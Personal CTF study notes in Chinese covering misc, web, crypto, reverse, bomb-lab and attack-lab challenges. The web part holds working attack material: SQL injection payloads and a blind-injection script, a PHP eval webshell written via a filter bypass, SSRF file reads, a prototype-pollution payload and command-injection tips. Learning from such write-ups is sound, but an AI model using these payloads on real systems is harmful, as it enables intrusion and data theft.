@@ -1,0 +1,1136 @@
+---
+title: ctf
+date: 2023-09-11 13:35:36
+tags:
+---
+
+# 杂项
+
+## 01题 Invisible Flag：
+
+高不够时
+
+<img src="https://img1.imgtp.com/2023/08/29/OaHvDfEw.png" alt="1_01_1" style="zoom:50%;" />
+
+先查看图片属性长宽转为16进制，再使用010editor等二进制查看图片长宽的十六进制并修改
+
+<img src="https://img1.imgtp.com/2023/09/03/orQ0TfBj.png" alt="image-20230709231732754" style="zoom:50%;" />
+
+## 02题 Another 01Game：
+
+01字符先看长度是否能除7/8 来判断是否为ascii编码，如果除不尽检查是否为平方，判断是否为二维码
+
+`from PIL import Image
+MAX = 平方数
+pic = Image.new("RGB",(MAX, MAX))
+str = "二进制数字"
+i=0
+for y in range (0,MAX):
+    for x in range (0,MAX):
+        if(str[i] == '1'):
+            pic.putpixel([x,y],(0, 0, 0))
+        else:
+            pic.putpixel([x,y],(255,255,255))
+        i = i+1
+pic.show()
+pic.save("flag.png")`
+
+得出二维码扫描再次得出二进制
+
+<img src="https://img1.imgtp.com/2023/09/03/5gFToWeK.png" alt="微信图片_20230709234111" style="zoom:33%;" />
+
+此次可以除尽7
+
+<img src="https://img1.imgtp.com/2023/09/03/yhsaJDoC.png" alt="image-20230710001501714" style="zoom:50%;" />
+
+在线网址为
+
+[编码网址]: https://coding.tools/cn
+
+## 03题 隐藏：
+
+<img src="https://img1.imgtp.com/2023/09/03/kc9KOqHa.png" alt="image-20230731020046291" style="zoom:67%;" />
+
+## 04题 文件格式：
+
+![image-20230824214021124](https://img1.imgtp.com/2023/09/03/6b4gIFjJ.png)
+
+## 05题 熟读登录密码三百首：
+
+```python
+import telnetlib
+import time
+
+tn = telnetlib.Telnet("10.140.32.159",48127)
+#tn
+tn.write('whosyourdaddy'.encode('utf-8') + b'\n')
+
+time.sleep(0.02)
+
+res = tn.read_very_eager().decode('utf-8')
+
+#res
+print(res)
+#print(type(res))
+#print('\n\n\n')
+res = res[130:].replace('\n','')
+print(res)
+
+s = ''
+password = []
+for i in res:
+  if i!=' ':
+    s+=i
+  else:
+    password.append(s)
+    s=''
+
+print(password)
+
+for i in range(len(password)):
+  payload = 'login [' + password[i] + ']'
+  print(payload)
+  tn.write(payload.encode('utf-8') + b'\n')
+
+  res = tn.read_very_eager().decode('utf-8')
+  print(res)
+  time.sleep(0.02)
+```
+
+
+
+# Web
+
+## 01题 Basic PHP：
+
+php弱绕过
+
+md5 0e
+
+`240610708:0e462097431906509019562988736854
+QLTHNDT:0e405967825401955372549139051580
+QNKCDZO:0e830400451993494058024219903391
+PJNPDWY:0e291529052894702774557631701704
+NWWKITQ:0e763082070976038347657360817689
+NOOPCJF:0e818888003657176127862245791911
+MMHUWUV:0e701732711630150438129209816536
+MAUXXQC:0e478478466848439040434801845361`
+
+sha1 0e
+
+`10932435112: 0e07766915004133176347055865026311692244
+aaroZmOk: 0e66507019969427134894567494305185566735
+aaK1STfY: 0e76658526655756207688271159624026011393
+aaO8zKZF: 0e89257456677279068558073954252716165668
+aa3OFF9m: 0e36977786278517984959260394024281014729
+0e1290633704: 0e19985187802402577070739524195726831799`
+
+php强绕过
+
+数组绕过
+
+[其他详细见此](https://blog.csdn.net/cosmoslin/article/details/120973888)
+
+<img src="https://img1.imgtp.com/2023/09/03/aw7pskdl.png" alt="image-20230719204041673" style="zoom:50%;" />
+
+## 02题 helloworld：
+
+get和post传参，可以使用requests库，可以使用hackbar
+
+<img src="https://img1.imgtp.com/2023/09/03/U7sQG7TY.png" alt="35f6b21557ddf88c2fb41637c2015aa" style="zoom:80%;" />
+
+得到结果要求使用get传
+
+<img src="https://img1.imgtp.com/2023/09/03/AraVyzGF.png" alt="image-20230729015943059" style="zoom:50%;" />
+
+在网页中直接传参
+
+<img src="https://img1.imgtp.com/2023/09/03/zTao5Cx7.png" alt="9bac75783cc460dae8868cb306eb3f2" style="zoom:67%;" />
+
+## 03题 BabyXSS：
+
+md5截断：
+
+## 04题(攻防世界) wife_wife：
+
+原型链污染攻击
+
+[参考博客](https://blog.lxscloud.top/2022/11/13/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/)
+
+`{"username":"1","password":"1","__proto__":{"isAdmin":true}}`
+
+![image-20230822162302977](https://img1.imgtp.com/2023/09/03/lejPgvDh.png)
+
+## 05题(攻防世界) command_execution(ping)：
+
+题目是小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。
+
+在ping中夹杂系统命令，首先需要进行截断。
+
+windows 或 linux 下:
+
+command1 && command2 先执行 command1，如果为真，再执行 command2
+
+command1 | command2 只执行 command2
+
+command1 & command2 先执行 command2 后执行command1
+
+command1 || command2 先执行 command1，如果为假，再执行 command2
+
+![image-20230822183510121](https://img1.imgtp.com/2023/09/03/XU3x17BT.png)
+
+可以看到只要能执行第二个命令即可
+
+可以通过ping能通的网站也可以直接写在第二个
+
+find / -name  /：意思是从/开始进行查找。
+
+<img src="https://img1.imgtp.com/2023/09/03/6FMoai0w.png" alt="image-20230822190239082" style="zoom: 80%;" />
+
+再用cat命令获得具体内容
+
+![image-20230822190445615](https://img1.imgtp.com/2023/09/03/WIODhlUC.png)
+
+### 类05题 网络调试工具
+
+先加ls 发现有flag
+
+![image-20230829142839428](https://img1.imgtp.com/2023/09/03/ohSkaXdL.png)
+
+## 06题(攻防世界ssrf)very_easy_sql：
+
+
+
+## 07题 local_curl：
+
+也是ssrf题，使用file:///flag解出答案
+
+## 08题 头儿：
+
+![image-20230828112129732](https://img1.imgtp.com/2023/09/03/lx0tNUDe.png)
+
+题目可以看出是头部信息
+
+查询$_SERVER可以看出，数组内信息转头部时要进行一定转换
+
+![image-20230828112107217](https://img1.imgtp.com/2023/09/03/3JqBhbQj.png)
+
+## 09题 PHP之神奇的反序列化：
+
+已知反序列化问题 要post上一个b 绕过“waking up”让他unserialize的结果是gimmeflag
+
+分析代码
+
+<img src="https://img1.imgtp.com/2023/09/03/CepxO375.png" alt="image-20230829093809255" style="zoom:80%;" />
+
+## 10题 PHP之Mission Impossible：
+
+> isset():判断变量已设置且非null
+>
+> preg_replace():正则表达式的搜索和替换
+
+![image-20230829144045003](https://img1.imgtp.com/2023/09/03/X0c0B5Se.png)
+
+将/[\s\S]*/替换成nope
+
+其中 \s替换空白字符  *匹配前面无数次  [.\n]匹配包括 '\n' 在内的任何字符 \S匹配非空白字符
+
+i：表示不区分大小写
+
+使用数组输入get，会**绕过数组**
+
+## 11题 web sqlite:
+
+传入1‘ or '1'='1 判断闭合方式是否为'
+
+![image-20230901172747718](https://img1.imgtp.com/2023/09/03/8q9ekeJx.png)
+
+可以看出是正确的
+
+下面看一共几列
+
+```php
+ID=1' order by 5--+
+```
+
+![image-20230901172959713](https://img1.imgtp.com/2023/09/03/CLzCFzel.png)
+
+这说明成功
+
+![image-20230901173202028](https://img1.imgtp.com/2023/09/03/U5OCpcBt.png)
+
+这说明失败
+
+最终找到9列，union select 1,2,3,4,5,6,7,8,9--+来找从哪一列注入
+
+![image-20230901173353567](https://img1.imgtp.com/2023/09/03/NwzmgK5x.png)
+
+发现从第1列
+
+ID='union select (select group_concat(sql) from sqlite_master),2,3,4,5,6,7,8,9--+
+
+![image-20230901173804988](https://img1.imgtp.com/2023/09/03/TsAMD6Dw.png)
+
+可以看出表名为ctf，然后查ID
+
+select ID from ctf
+
+将查询出来的ID输入到网页中进行GET得到flag
+
+![image-20230901204814164](https://img1.imgtp.com/2023/09/03/BV2d934T.png)
+
+### 类11题 简单的SQL注入
+
+注意查询时用id=-1这种查不到的最终
+
+```sqlite
+?id=-1' union select (select group_concat(sql) from sqlite_master),2 --+
+```
+
+![image-20230902154507995](https://img1.imgtp.com/2023/09/03/KvHhB0P3.png)
+
+最终结果利用sqlite注入语句
+
+![image-20230902154204547](https://img1.imgtp.com/2023/09/03/OEg7nVXG.png)
+
+### 类11题 Basic SQL(oj)
+
+```sql
+' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='news'#
+```
+
+找表
+
+```sql
+' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='f1agfl4gher3'#
+```
+
+找列
+
+```sql
+' union select 1,group_concat(h3r31sfl4g),3 from news.f1agfl4gher3 #
+```
+
+找内容   **from后加数据库.表名**
+
+![image-20230904151153680](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904151153680.png)
+
+## 12题 (oj木马绕过)Basic PHP 2：
+
+网站中代码如下
+
+```php
+<?php
+if(isset($_GET['content'])){
+  $filename = 'config.php';
+  $content = $_GET['content'];
+
+  if(is_int(stripos($content, 'php')) || is_int(stripos($content, '<'))) {
+    echo 'Invalid input';
+  } else {
+    file_put_contents($filename, $content);
+    echo 'Success';
+  }
+}
+```
+
+其中判定条件为不区分大小写的函数stripos()
+
+只有他俩都返回错误才能绕过，故可以传数组让函数本身报错
+
+而且需要在网页get中改动
+
+```php
+index.php?content[]=<?php+eval($_GET[a]);
+```
+
+![image-20230904165158558](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904165158558.png)
+
+## 13题 (oj)BasicFileInclude：
+
+文件包含漏洞：
+
+没有对变量进行严格校验或者校验被绕过。
+
+文件包含函数
+
+include/include_once/require/require_once
+
+本地文件包含；远程文件包含
+
+文件包含漏洞的利用方式：伪协议
+
+file是本地文件访问，既可以利用文件包含漏洞也可以执行SSRF攻击。
+
+![image-20230904193755017](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904193755017.png)
+
+本题得出
+
+![image-20230904194157008](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904194157008.png)
+
+## CTFHUB：
+
+### 01 请求方式HTTP-methed 
+
+抓包后将左上角GET方式改成题目要求的CTFHUB
+
+### 02 HTTP临时重定向 
+
+重定向是服务器无法处理请求时，告诉客户端的浏览器自己跳转到另外一个网页去
+
+重定向与请求转发的区别：
+
+请求转发是服务器发送到其他服务器进行处理，必须是同一个web容器下的url，其不能转向到其他的web路径上去，客户端只发了一个请求
+
+重定向是收到后发送302状态码和新地址 让客户端再次进行请求跳转到新地址
+
+状态码：301 永久性转移 302 临时性转移
+
+![image-20230827162653030](https://img1.imgtp.com/2023/09/03/2Kcj6aAo.png)
+
+因为curl默认是不跟随重定向的
+
+使用curl  curl http://challenge-3c927192ce7669f9.sandbox.ctfhub.com:10800/index.php
+
+不会跳转，curl -L会跳转
+
+### 03 cookie(easy)
+
+抓包之后修改cookie
+
+### 04 sql注入之整数型注入
+
+
+
+### 05 sql注入之字符型注入
+
+闭合 看到字符串类型 
+
+```php
+' or '1'='1   万能模板
+```
+
+试探闭合方式 为引号
+
+闭合符号尝试
+
+```php
+--+
+#
+```
+
+可以看出第一种注释符没有用
+
+![image-20230828101946303](https://img1.imgtp.com/2023/09/03/7HSRHLNq.png)
+
+尝试第二种
+
+![image-20230828101751653](https://img1.imgtp.com/2023/09/03/8bMIoqRN.png)
+
+3没有
+
+![image-20230828101837158](https://img1.imgtp.com/2023/09/03/Hiwk4mbz.png)
+
+2可以 说明是2列
+
+再查找目标在第几列 可以看到1，2都可以
+
+![image-20230828102248514](https://img1.imgtp.com/2023/09/03/9G9QzBim.png)
+
+查找数据库
+
+![image-20230828102728848](https://img1.imgtp.com/2023/09/03/JBBVGHyv.png)
+
+查找表
+
+```sql
+' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' #
+```
+
+![image-20230828103106251](https://img1.imgtp.com/2023/09/03/TrrRSNLh.png)
+
+查找列
+
+```sql
+' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #
+```
+
+![image-20230828103437081](https://img1.imgtp.com/2023/09/03/JEAk0kaQ.PNG)
+
+查找列内容
+
+```sql
+' union select 1,group_concat(flag) from sqli.flag #
+```
+
+![image-20230828103726958](https://img1.imgtp.com/2023/09/03/QjMbTgoi.png)
+
+### 06 sql注入之报错型注入
+
+
+
+### 07 sql注入之布尔盲注
+
+```python
+import requests
+import time
+
+urlOPEN = 'http://challenge-45c8b825d982f37a.sandbox.ctfhub.com:10800/?id='
+starOperatorTime = []
+mark = 'query_success'
+#成功显示结果
+
+
+def database_name():
+    name = ''
+    for j in range(1, 5):
+        for i in 'sqcwertyuioplkjhgfdazxvbnm':
+            url = urlOPEN + 'if(substr(database(),%d,1)="%s",1,(select table_name from information_schema.tables))' % (
+            j, i)
+            # print(url+'%23')
+            r = requests.get(url)
+            if mark in r.text:
+                name = name + i
+
+                print(name)
+
+                break
+    print('database_name:', name)
+
+
+database_name()
+
+
+def table_name():
+    list = []
+    for k in range(0, 4):
+        name = ''
+        for j in range(1, 9):
+            for i in 'sqcwertyuioplkjhgfdazxvbnm':
+                url = urlOPEN + 'if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' % (
+                k, j, i)
+                # print(url+'%23')
+                r = requests.get(url)
+                if mark in r.text:
+                    name = name + i
+                    break
+        list.append(name)
+    print('table_name:', list)
+# start = time.time()
+table_name()
+def column_name():
+    list = []
+    for k in range(0, 3):  # 判断表里最多有4个字段
+        name = ''
+        for j in range(1, 9):  # 判断一个 字段名最多有9个字符组成
+            for i in 'sqcwertyuioplkjhgfdazxvbnm':
+                url = urlOPEN + 'if(substr((select column_name from information_schema.columns where table_name="flag"and table_schema= database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' % (
+                k, j, i)
+                r = requests.get(url)
+                if mark in r.text:
+                    name = name + i
+                    break
+        list.append(name)
+    print('column_name:', list)
+column_name()
+def get_data():
+    name = ''
+    for j in range(1, 50):  # 判断一个值最多有51个字符组成
+        for i in range(48, 126):
+            url = urlOPEN + 'if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))' % (
+            j, i)
+            r = requests.get(url)
+            if mark in r.text:
+                name = name + chr(i)
+                print(name)
+                break
+    print('value:', name)
+
+
+get_data()
+
+```
+
+
+
+### 08 ssrf之内网访问
+
+直接在url上=127.0.0.1/flag.php
+
+### 09 ssrf之伪协议读取文件
+
+让在web目录，根据经验php的web目录路径为：/var/www/html/
+
+构造payload:
+
+```url
+?url=file:///var/www/html/flag.php
+```
+
+### 10 ssrf之端口扫描
+
+```python
+import requests
+url="http://challenge-e35db79659317cae.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000"
+for index in range(8000,9001):
+  url_1= f"http://challenge-e35db79659317cae.sandbox.ctfhub.com:10800/?url=127.0.0.1:{index}"
+  res = requests.get(url_1)
+  print(index,res.text)
+```
+
+# 密码
+
+## 01题 What's RSA？:
+
+拥有私钥时：
+
+在kali中输入命令
+
+<img src="https://img1.imgtp.com/2023/09/03/WPnUEM6v.png" alt="9109331575293a3e7d98246a9fa6d09" style="zoom:50%;" />
+
+## 02题 RSA2：
+
+当拥有公钥时：
+
+首先从公钥中获取e和m
+
+<img src="https://img1.imgtp.com/2023/09/03/09t9398N.png" alt="66e44afaf54afdf3fbc9561b4623676" style="zoom:50%;" />
+
+将16进制m进行转换
+
+<img src="https://img1.imgtp.com/2023/09/03/JsKSJCN8.png" alt="4748f7702c1a3547d377fdf9b76fb8a" style="zoom:50%;" />
+
+利用http://factordb.com/进行拆解，得出p,q
+
+![image-20230723004645846](https://img1.imgtp.com/2023/09/03/UMeatThD.png)
+
+p= [275127860351348928173285174381581152299](http://factordb.com/index.php?id=1100000000836631227)
+
+q=[319576316814478949870590164193048041239](http://factordb.com/index.php?id=1100000000836631226)
+
+## 03题 Wiener Tricky：
+
+
+
+## 04题 crypto1:
+
+由于提示中有凯撒密码 并且加密形式是base64于是穷举凯撒密码中可以成功得出base64解密的字符串，但并未用上get data条件
+
+<img src="https://img1.imgtp.com/2023/09/03/5WkC2nd1.png" alt="image-20230728110757271" style="zoom: 50%;" />
+
+<img src="C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230728110731917.png" alt="image-20230728110731917" style="zoom:50%;" />
+
+## 05题 crypto2:
+
+同题目4后得到flag放入data中
+
+![微信图片_20230729010733](C:\Users\李佳艺\Downloads\微信图片_20230729010733.png)
+
+得出flag 进入p2
+
+可以看出N1=N2且e互素 共模攻击
+`import gmpy2`
+`import libnum`
+`s,s1,s2=gmpy2.gcdext(e1,e2)`
+`m=(pow(c1,s1,n1)*pow(c2,s2,n2))%n1`
+`print(libnum.n2s(int(m)).decode())`
+
+![image-20230730020447217](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230730020447217.png)
+
+# Reverse
+
+## 01题 Reverse sign in：
+
+将其放入IDA中点击main函数和F5得到代码 其中可以看到通过判断flag正确与否的条件反推flag
+
+那么接下来看一下sub_400686的函数的判断条件
+
+![image-20230731023100984](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731023100984.png)
+
+可以看出下面是此函数的代码 对其进行了异或操作
+
+![image-20230731023435208](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731023435208.png)
+
+与818进行异或 下面进行编码
+
+![image-20230731023711128](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731023711128.png)
+
+`#include <iostream>
+using namespace std;
+int main()
+{
+	int b[]={0x66,0x6D, 0x63, 0x64, 0x7F, 0x3C, 0x36, 0x72, 0x57, 0x42, 0x64,
+	0x3B, 0x7B, 0x52, 0x7C, 0x3C, 0x66, 0x54, 0x60,0x60, 0x27,
+	0x4A, 0x49, 0x7F, 0x71, 0x58, 0x52, 0x72, 0x7D, 0x75, 0x2A, 0x62};
+	char a[33];
+	for(int i=0;i<=31;i++)
+	{
+		a[i]= b[i]^i;
+	}
+	for(int j=0;j<=31;j++)
+	{
+		cout<<a[j];
+	}
+	cout<<endl;
+	return 0;
+}`
+
+得出flag
+
+![image-20230731022421669](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731022421669.png)
+
+## 02题 math：
+
+![image-20230731033641297](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731033641297.png)
+
+![image-20230731034103577](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731034103577.png)
+
+![image-20230731034126114](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731034126114.png)
+
+## 03题 rev1：
+
+首先阅读函数内容
+
+<img src="C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223252403.png" alt="image-20230731223252403" style="zoom:67%;" />
+
+找到有用户名密码的函数
+
+<img src="C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223421005.png" alt="image-20230731223421005" style="zoom: 67%;" />
+
+<img src="C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223500230.png" alt="image-20230731223500230" style="zoom: 67%;" />
+
+
+
+![image-20230731223535007](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223535007.png)
+
+可以看到用户名的判断中需要和login_name的ascii码相同 得出用户名superuser
+
+<img src="C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731224138342.png" alt="image-20230731224138342" style="zoom:67%;" />
+
+对应编写程序得到
+
+<img src="C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731224438711.png" alt="image-20230731224438711" style="zoom:50%;" />
+
+得出密码uvwpqrslmnohijk
+
+![image-20230731230530385](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731230530385.png)
+
+得出flag
+
+## 04题 rev2:
+
+注意到上题所说的another flag
+
+Here is another one question hint info: transpose
+
+Here is another flag: <code>0x19,0xffffffa5,0xffffffc9,0xffffffe8,0xffffffa4,0xffffffb8,0x08,0xffffffda,0xffffffd0,0xffffff8a,0xffffffc9,0xffffffc5,0x6a,0xffffffe1,0xffffffdd,0xffffffd8,0xffffffdd,0xffffff84,0x4b,0xffffffca,0xffffffee,0xffffffc6,0xffffffe7,0x42,0x04,0xfffffff7,0xffffff96,0xffffffe4,0xffffffe3,0x5d,0xffffff8c,0xffffffaf,0xffffffeb,0xfffffff5,0xffffffa2,0x4a,0xffffffa4,0xfffffff2,0xffffff8d,0xffffffb1,0xffffffc8,0x12,</code>
+
+## 05题 二进制炸弹：
+
+#### phase_1  简单寻址比较
+
+首先看到phase_1   它call了一个函数指令
+
+![image-20230822211704988](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230822211704988.png)
+
+x86-64的过程调用原则
+
+1.函数调用中，利用%rax寄存器保存返回值。
+
+2.关于参数传递，如果函数参数不超过6个，会依次通过%rdi,%rsi,%rdx,%rcx,%r8,%r9传递，如果超过6个参数，超出参数使用栈传递。
+
+汇编指令：
+
+mov ax,bx  将ax寄存器内容给b寄存器
+
+mov 立即数,%ax  将立即数内容给ax
+
+mov %ax,%bx 将ax寄存器的数复制给bx
+
+sub ax,bx   ax寄存器内容减去bx寄存器内容存入ax
+
+实验先导条件：
+
+1.进行反汇编 得到具体执行内容
+
+`objdump -d bomb > bomb.s`
+
+2.使用gdb进行调试
+
+`gdb bomb`
+
+3.设置断点
+
+`break phase_1`
+
+`break *0x400ee9`
+
+4.清除断点
+
+clear +上面
+
+5.查看寄存器字符串
+
+`x/s $esi`
+
+6.检查寄存器或者某个地址
+
+`x/4wd $esi`
+
+7.layout asm
+
+分析phase_1代码结合过程调用原则
+
+1.输入给rax作为第一个值，立即数0x402400给esi作为第二个值
+
+2.函数进行比较看eax结果是否为0，若为0跳过
+
+3.现在问题是要知道立即数0x402400存的什么
+
+在400ee9也就是esi后面设置断点后，检查字符串
+
+![image-20230822215000066](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230822215000066.png)
+
+复制并输入
+
+Border relations with Canada have never been better.
+
+这是第一个阶段的输入
+
+gedit 文件名字 创建文件
+
+![image-20230823204259128](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823204259128.png)
+
+#### phase_2  栈、指针与循环
+
+下面进行第二个阶段
+
+运行第二步时先设置break phase_2
+
+输入r test 跳过第一步 到断点后ni
+
+![image-20230823184953085](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823184953085.png)
+
+经过第一阶段已经了解寄存器使用规则，先看函数内容
+
+![image-20230823194258569](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823194258569.png)
+
+汇编指令：
+
+lea    0x4(%rsi),%rcx 加载一个内存地址将 %rsi寄存器中的值加上偏移量 0x4计算出的内存地址存储到目标寄存器%rcx
+
+查看它的输入前后来确定输入数量，可以看到他输入前将eax置为立即数0，再往前就是将立即数0x4025c3存到esi中 查看立即数内字符 可以看出有六个数字
+
+![image-20230823212815266](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823212815266.png)
+
+读取6个字符后，首先rsp与1进行比较，相等跳到30
+
+30中将bx指向栈顶sp指针+4个字节->第二个数 bp指向sp加24个字节->第6个数
+
+再跳回17 bx的前一个数也就是第一个数(上面是指针带地址所以可以找到第一个数)存ax，让他乘2与bx(第二个数)比较判断是否为2倍关系。然后继续循环。
+
+总结：循环和c语言指针问题
+
+#### phase_3 switch分支
+
+![image-20230824153953913](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824153953913.png)
+
+先看源代码
+
+![image-20230824153053407](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824153053407.png)
+
+rdx存第二个，rcx存第三个，判断eax作为接口返回值和1相比，判断7和第二个数，7大跳炸弹->让7小于那个数
+
+![image-20230824193854239](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824193854239.png)
+
+直接告诉你两个数
+
+![image-20230824193830593](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824193830593.png)
+
+然后继续跳
+
+比较第一个数和7，写的2 比过之后gdb带着跳到该去的分支 可以看到第二个要填707
+
+![image-20230824200021842](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824200021842.png)
+
+成功做出
+
+![image-20230824200239519](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824200239519.png)
+
+#### phase_4 递归(救命忘记用IDA看汇编生做的)
+
+第四个阶段
+
+![image-20230831133922755](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230831133922755.png)
+
+汇编指令
+
+> shr 位操作 将其二进制表示向右移动一定的位数
+>
+> sar 算数位移 最高位补按照有符号规则补
+>
+> lea 计算有效地址  其中lea (%rax,%rsi,1),%ecx，带有偏移和索引的内存寻址方式。将 `%rax` 寄存器的值加上 `%rsi` 寄存器的值，并且不进行缩放（因为缩放因子是1），得到的结果作为内存地址。并把内存地址传入%ecx中。其中lea 0x1(%rcx),%esi，把rcx的值加上0x1，作为内存地址存入esi中。
+>
+> jle Jump if Less Than or Equal cmp中后减前(cx-di)之后会置标志位 大于SF置为1 小于SF置为0 等于ZF置为1.也就是cx(后)是否小于等于di(前)
+
+mov %edx,%eax时，参考上面edx被赋值为14，此时eax,edx均为14，di为传参第一个参数，si为第二个参数，看到后面可知第二个参数与0进行比较，应该是0
+
+![](C:\Users\李佳艺\Desktop\2.PNG)
+
+故d6做完后ax,cx,dx均为14，d8做完后，将ecx向右移了31位，正数左补0，于是cx变成0，把cx加入ax中，ax仍为14
+
+dd的sar语句做完之后，eax变为7
+
+df的lea指令做完后，ecx变为7，下一步比较edi和ecx，也就是传入的第一个参数和固定值7比较
+
+e4跳转指令执行后，由于我传入数为10，7小于10 符合跳转指令至f2
+
+把eax置为0 并进行和上一个相同的比较 如果大于等于跳转 7小于10 不符合跳转指令
+
+![1](C:\Users\李佳艺\Desktop\1.PNG)
+
+继续执行lea指令将rcx+1存入si
+
+此时ax=0 cx=7 dx=14 si=8 di=10
+
+再次循环func4 把dx赋ax,ax-si,ax赋cx,cx右移
+
+```
+ax cx dx si di
+14 7 14 8 10
+ 6 7 14 8 10
+ 6 6 14 8 10 
+ 6 0 14 8 10
+ 6 0 14 8 10
+ 3 0 14 8 10
+3 11 14 8 10
+3 11 10 8 10
+```
+
+再次循环func4
+
+```
+ax cx dx si di
+10 11 10 8 10
+ 2 11 10 8 10
+ 2  2 10 8 10
+ 2  0 10 8 10
+ 2  0 10 8 10
+ 1  0 10 8 10
+ 1  9 10 8 10
+跳转
+ 0  9 10 8 10
+ 0 9 10 10 10
+```
+
+再次
+
+比较时
+
+0 10 10 10 10
+
+发现是不容易找到规律的循环后，我们进行c语言代码编写 递归要确定**有几个参数 如何运算的**
+
+```c
+//func4 伪c 三个参数 di si dx 分别为第一个参数 第二个参数 14
+ax=dx;
+ax=ax-si;//(3-2)
+cx=ax;
+cx>>31;//取符号位
+ax=ax+cx;//(3-2)
+ax>>1;//(3-2)/2 
+cx=ax+si;//(3-2)/2+2 2-3中间那个数
+if(cx<=di)//中间那个数与第一个参数比较
+    跳转
+    ax=0;
+	if(cx>=di)
+        跳转
+        ret//等于的时候出去
+     else
+        si=cx+1;//像二分法
+		重回func4
+else
+    dx=cx-1;
+	重回func4
+```
+
+![image-20230901141220849](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230901141220849.png)
+
+#### phase_5 
+
+第五个炸弹的函数如下：
+
+![image-20230905135853755](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230905135853755.png)
+
+首先判断字符串长度是否为6
+
+汇编指令
+
+异或：清零
+
+## 06题 缓冲区溢出：
+
+ctarget:易受代码注入攻击的可执行程序
+
+rtarget:易受返回导向编程攻击的可执行程序
+
+cookie.txt: 8位十六进制代码，您将在攻击中将其⽤作唯⼀标识符。
+
+farm.c：目标“小工具农场”的源代码，将使用它来生成面向返回的编程攻击
+
+hex2raw：⽣成攻击字符串的实⽤程序
+
+学习背景：CSAPP第3.10节
+
+首先找到了ctarget中的touch1、2、3
+
+> **调用指令**执行时
+>
+> 执行调用指令时，当前指令的下一条指令的地址（通常是当前指令地址加上一个偏移量）会被计算出来。
+>
+> 计算得到的下一条指令的地址会被推入栈的栈顶，同时栈顶指针会相应地减小，以指向新的栈顶位置。
+>
+> 当函数执行完毕并准备返回时，会从栈中弹出保存的返回地址，栈顶指针也会相应地增加，以指向栈的新的栈顶位置。
+
+#### touch1
+
+通过上面的getbuf查看缓冲区大小
+
+![image-20230906215341923](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230906215341923.png)
+
+查看可知有40个字节
+
+查看touch1函数，得知我们要调Touch1函数
+
+![image-20230907162833917](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907162833917.png)
+
+结合四十字节的缓冲区，我们先写入40字节字符 注(00)是一个字节 后面加上touch1地址
+
+写入test文件中 其中调用touch1时是小端地址
+
+```
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00 /*其中touch1地址为0x4017c0
+```
+
+得到这个可以看出已经通过touch1 得到
+
+![image-20230907144401247](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907144401247.png)
+
+#### touch2
+
+调用函数时，先存下一个指令的地址压入栈，执行调用结束，最终遇到ret指令，下一条指令弹出并进行跳转。
+
+于是为了跳转到touch2先把touch2的起始地址压入栈中 这样再ret的时候就会直接到touch2
+
+缓冲区中超出buf部分则是返回地址
+
+注意是返回地址而不是可以执行指令
+
+将想执行的指令放入栈中，然后在缓冲区处打断点，在断点处查看此时sp的值
+
+写入指令为先mov再push再ret
+
+这三条指令的分布位置为
+
+栈顶(查看的地址)-mov-push-ret
+
+就是将开始本应该返回call的下一条指令的地址改成了缓冲区的地址
+
